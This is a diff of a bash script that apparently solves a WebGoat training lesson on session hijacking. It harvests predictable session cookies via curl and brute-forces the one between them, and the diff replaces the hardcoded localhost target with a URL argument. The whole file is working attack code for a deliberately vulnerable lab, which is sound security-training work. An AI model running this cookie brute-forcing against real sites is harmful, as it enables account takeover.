@@ -1,13 +1,17 @@
 #!/bin/bash
 limit=$2
 diff=$4
+hijack_cookie_prev=''
+hijack_cookie=''
+url=$5
 for i in $(seq 1 $limit)
 do 
+	hijack_cookie_prev=$hijack_cookie
 	hijack_cookie=$(curl -i -s -k -X  'POST' \
 		-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
 		-H "Cookie: JSESSIONID=$1"  \
 		--data-raw $'username=foo&password=bar' \
-		'http://localhost:8080/WebGoat/HijackSession/login' \
+		$url \
 		2>/dev/null | grep -i '^Set-Cookie:' | grep -oP '(?<=hijack_cookie=)[^;]+')
 	
 	parte1=${hijack_cookie%-*}
@@ -36,13 +40,16 @@ do
 			-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
 			-H "Cookie: JSESSIONID=$1; $hijack_cookie_temp;"  \
 			--data-raw $'username=foo&password=bar' \
-			'http://localhost:8080/WebGoat/HijackSession/login')
+			$url \
+			2>/dev/null)
 			lessonCompleted=$(echo $salida | jq -r '.lessonCompleted')
-
 			if ($lessonCompleted); then
 				echo "Listo! la cookie era $hijack_cookie_temp"
 				echo $salida | jq .
-				else
+				echo "hijack_cookie=$hijack_cookie_prev"
+				echo "$hijack_cookie_temp<--"
+				echo "hijack_cookie=$hijack_cookie"				
+			else
 				printf '\nNope!\n\n'
 			fi
 		done		
